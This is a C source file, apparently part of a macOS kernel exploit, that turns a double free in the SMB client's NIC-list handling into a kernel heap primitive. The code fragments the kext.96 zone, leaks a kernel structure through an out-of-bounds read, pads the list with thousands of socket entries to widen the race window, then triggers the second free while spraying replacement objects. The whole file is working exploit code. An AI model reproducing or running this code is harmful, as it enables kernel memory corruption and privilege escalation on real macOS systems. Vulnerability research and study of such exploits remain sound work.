//
//  zfree_kext.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <stdlib.h>
#include <string.h>

#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xe/util/misc.h>
#include <xe/util/dispatch.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>

#include "../smb/nic_allocator.h"
#include "../smb/client.h"

#include "kheap_free.h"
#include "allocator_rw.h"
#include "allocator_nrnw.h"
#include "allocator_nic_parallel.h"
#include "oob_reader_ovf.h"

#include <macos/kernel.h>


#define NUM_SLOW_DOWN_NICS 25
#define NUM_SOCKETS_PER_SLOW_DOWN_NIC 12500
#define NUM_KEXT_96_FRAGMENTED_PAGES 1024


struct xe_kheap_free_session {
    kmem_allocator_nrnw_t nrnw_allocator;
    smb_nic_allocator nic_allocator;
    kmem_allocator_nic_parallel_t capture_allocator;
    
    enum {
        STATE_CREATED,
        STATE_PREPARED,
        STATE_DONE
    } state;
    
    struct sockaddr_in smb_addr;
};


int xe_kheap_free_leak_nic(smb_nic_allocator allocator, const struct sockaddr_in* addr, struct complete_nic_info_entry* out) {
    
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
    
    int num_gaps = XE_PAGE_SIZE / 96 * 4;
    
    /// Fragment kext.96 zone
    for (int gap_idx = 0; gap_idx < num_gaps; gap_idx++) {
        struct network_nic_info element;
        bzero(&element, sizeof(element));
        element.nic_index = gap_idx;
        element.addr_4.sin_len = sizeof(struct sockaddr_in);
        element.addr_4.sin_family = AF_INET;
        
        int error = smb_nic_allocator_allocate(allocator, &element, 1, (uint32_t)sizeof(element));
        xe_assert_err(error);
        
        struct network_nic_info gap;
        bzero(&gap, sizeof(gap));
        gap.nic_index = gap_idx;
        gap.addr_4.sin_family = AF_INET;
        gap.addr_4.sin_len = sizeof(struct sockaddr_in);
        
        error = smb_nic_allocator_allocate(gap_allocator, &gap, 1, sizeof(gap));
        xe_assert_err(error);
    }
    
    int error = smb_nic_allocator_destroy(&gap_allocator);
    xe_assert_err(error);
    
    struct complete_nic_info_entry* entry = alloca(96);
    /// Read the `struct complete_nic_info_entry` from the fragment kext.96 zone
    error = oob_reader_ovf_read(addr, 96, (char*)entry, 96);
    if (error) {
        return error;
    }
    
    /// `tqe_prev` of tailq entry is always initalized
    if (!xe_vm_kernel_address_valid((uintptr_t)entry->next.tqe_prev)) {
        return EIO;
    }
    
    /// `tqh_last` of tailq head is always initialized
    if (!xe_vm_kernel_address_valid((uintptr_t)entry->addr_list.tqh_last)) {
        return EIO;
    }
    
    if (entry->nic_index > num_gaps) {
        return EIO;
    }
    
    memcpy(out, entry, sizeof(*out));
    return 0;
}


void xe_kheap_free_alloc_slowdown_nic(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = xe_min(max_batch_size, count - done);
        struct network_nic_info infos[batch_size];
        bzero(infos, sizeof(infos));
        for (int sock_idx = 0; sock_idx < batch_size; sock_idx++) {
            struct network_nic_info* info = &infos[sock_idx];
            info->nic_index = nic_index;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = sin_len;
            /// We have to provide unique `sin_addr` for each socket address in the NIC
            info->addr_4.sin_addr.s_addr = (uint32_t)done + sock_idx;
            info->next_offset = sizeof(*info);
            /// The tailq entries in `client_nic_info_list` are sorted by their `nic_link_speed`
            /// at the time of insertion. Providing a large value makes sure these slow down
            /// NICs end up in the head of `client_nic_info_list` tailq
            info->nic_link_speed = UINT32_MAX;
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
        xe_assert_err(error);
        done += batch_size;
    }
}


xe_kheap_free_session_t xe_kheap_free_session_create(const struct sockaddr_in* smb_addr) {
    xe_kheap_free_session_t session = malloc(sizeof(struct xe_kheap_free_session));
    session->smb_addr = *smb_addr;
    session->nic_allocator = -1;
    session->capture_allocator = NULL;
    session->nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
    session->state = STATE_CREATED;
    return session;
}


struct complete_nic_info_entry xe_kheap_free_session_prepare(xe_kheap_free_session_t session) {
    xe_assert(session->state == STATE_CREATED);
    /// Leak a `struct complete_nic_info_entry`
    smb_nic_allocator nic_allocator;
    struct complete_nic_info_entry entry;
    int tries = 10;
    do {
        nic_allocator = smb_nic_allocator_create(&session->smb_addr, sizeof(session->smb_addr));
        int error = xe_kheap_free_leak_nic(nic_allocator, &session->smb_addr, &entry);
        if (error) {
            smb_nic_allocator_destroy(&nic_allocator);
        } else {
            break;
        }
    } while (--tries);
    
    xe_assert(tries > 0);
    xe_assert(entry.next.tqe_prev != 0);
    
    session->nic_allocator = nic_allocator;
    session->state = STATE_PREPARED;
    return entry;
}


void xe_kheap_free_session_execute(xe_kheap_free_session_t session, const struct complete_nic_info_entry* entry) {
    xe_assert(session->state == STATE_PREPARED);
    
    xe_log_info("preparing for free");
    /// These slow down NICs will be inserted to the begining of tailq
    /// `sessionp->session_interface_table.client_nic_info_list`. The method
    /// `smb2_mc_release_interface_list` which will be triggering the second free will be
    /// releasing each NIC from the head of `client_nic_info_list`. So by adding these
    /// slow down NICs, we can increase the time interval between firs and second free
    for (int i = 0; i < NUM_SLOW_DOWN_NICS; i++) {
        if ((i % ((NUM_SLOW_DOWN_NICS + 9) / 10)) == 0) {
            xe_log_info("progress: %.2f%%", ((float)i / NUM_SLOW_DOWN_NICS) * 100.0);
        }
        xe_kheap_free_alloc_slowdown_nic(session->nic_allocator, INT32_MAX - i, NUM_SOCKETS_PER_SLOW_DOWN_NIC, sizeof(struct sockaddr_in));
    }
    xe_log_info("done perparing for free");

    /// The `struct complete_nic_info_entry` of double free NIC should not end in zone per
    /// CPU cache after first release. This can be done by associate socket addresses of size
    /// 96 to the double free NIC. Since these socket addresses are released before the release
    /// of `struct complete_nic_info_entry`, they will fill the per CPU cache of the CPU handling
    /// this job
    xe_kheap_free_alloc_slowdown_nic(session->nic_allocator, (uint32_t)entry->nic_index, 512, 96);
    
    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 512);

    /// Trigger the double free in background thread
    dispatch_semaphore_t sem_dbf_trigger = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        struct network_nic_info info;
        bzero(&info, sizeof(info));
        info.nic_index = (uint32_t)entry->nic_index;
        int error = smb_nic_allocator_allocate(session->nic_allocator, &info, 1, sizeof(info));
        xe_assert(error == ENOMEM);
        dispatch_semaphore_signal(sem_dbf_trigger);
    });
    
    /// In the same time, spray kext.96 with the replacement `struct complete_nic_info_entry`
    kmem_allocator_nic_parallel_alloc(capture_allocator, ((char*)entry) + 8, 88);
    dispatch_semaphore_wait(sem_dbf_trigger, DISPATCH_TIME_FOREVER);
    
    session->capture_allocator = capture_allocator;
    session->state = STATE_DONE;
}


void xe_kheap_free_session_destroy(xe_kheap_free_session_t* session_p) {
    xe_kheap_free_session_t session = *session_p;
    
    if (session->nic_allocator >= 0) {
        smb_nic_allocator_destroy(&session->nic_allocator);
    }
    
    if (session->capture_allocator) {
        kmem_allocator_nic_parallel_destroy(&session->capture_allocator);
    }
    
    kmem_allocator_nrnw_destroy(&session->nrnw_allocator);
    free(session);
    *session_p = NULL;
}

